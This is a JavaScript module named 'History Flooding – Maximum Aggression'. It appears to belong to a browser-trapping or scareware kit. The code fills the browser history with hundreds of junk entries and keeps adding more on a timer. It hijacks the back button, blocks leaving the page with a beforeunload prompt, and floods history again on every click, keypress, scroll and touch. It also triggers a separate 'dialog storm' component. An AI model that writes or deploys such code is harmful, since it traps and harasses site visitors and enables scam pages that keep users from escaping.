/**
 * 1. HISTORY FLOODING - MAXIMUM AGGRESSION
 */
const HistoryFlooding = {
    init: function() {
        this.floodHistory();
        this.preventNavigation();
        this.floodOnEveryAction();
    },
    floodHistory: function() {
        for (let i = 0; i < 500; i++) {
            history.pushState({flooded: true}, '', '#' + Math.random().toString(36).substring(7));
        }
        setInterval(() => {
            for (let i = 0; i < 50; i++) {
                history.pushState({flooded: true}, '', '#' + Math.random().toString(36).substring(7));
            }
        }, 500);
    },
    preventNavigation: function() {
        window.addEventListener('popstate', function(e) {
            history.pushState({trapped: true}, '', window.location.href);
            for (let i = 0; i < 100; i++) {
                history.pushState({flooded: true}, '', '#' + Math.random().toString(36).substring(7));
            }
            if (window.DialogStorms && !DialogStorms.active) { DialogStorms.active = true; DialogStorms.startStorm(); }
        });
        window.addEventListener('beforeunload', function(e) {
            e.preventDefault(); e.returnValue = '';
            for (let i = 0; i < 200; i++) { history.pushState({flooded: true}, '', '#' + Math.random().toString(36).substring(7)); }
        });
    },
    floodOnEveryAction: function() {
        ['click', 'keypress', 'scroll', 'touchstart'].forEach(evt => {
            document.addEventListener(evt, () => {
                for (let i = 0; i < 25; i++) { history.pushState({flooded: true}, '', '#' + Math.random().toString(36).substring(7)); }
            });
        });
    }
};